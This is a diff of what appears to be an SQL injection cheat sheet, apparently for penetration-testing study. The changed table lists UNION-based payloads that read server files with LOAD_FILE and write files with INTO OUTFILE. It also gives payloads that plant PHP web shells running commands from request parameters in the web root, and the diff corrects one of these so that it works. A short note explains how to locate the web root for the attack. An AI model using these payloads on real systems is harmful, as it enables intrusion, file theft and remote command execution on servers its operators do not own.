@@ -211,6 +211,6 @@ To be able to write files to the back-end server using a MySQL database, we requ
 | `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` | Another read local file example, useful to see how backend queries are handled |
 | `cn' UNION select 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -` | Write a string to a local file |
 | `cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
-| ```abc')+union+select+1,2,<?=`$_GET[0]`?>,4+INTO_FILE--+-``` | URL encoded workaround for writing a web shell to the base web directory |
+| ```abc')+union+select+1,2,'<?=`$_GET[0]`?>',4+INTO+OUTFILE+'/var/www/html/shell.php'--+-``` | URL encoded workaround for writing a web shell to the base web directory |
 
 **Note:** Web shells must be written to the base web directory for the web server (i.e. web root). Use load_file to read the server configuration at /etc/apache2/apache2.conf, /etc/nginx/nginx.conf or %WinDir%\System32\Inetsrv\Config\ApplicationHost.config are a few examples. Could also run a fuzzing scan and try to write files to different possible web roots, using [Linux wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [Windows wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). We can also use server errors to possibly display the web root.
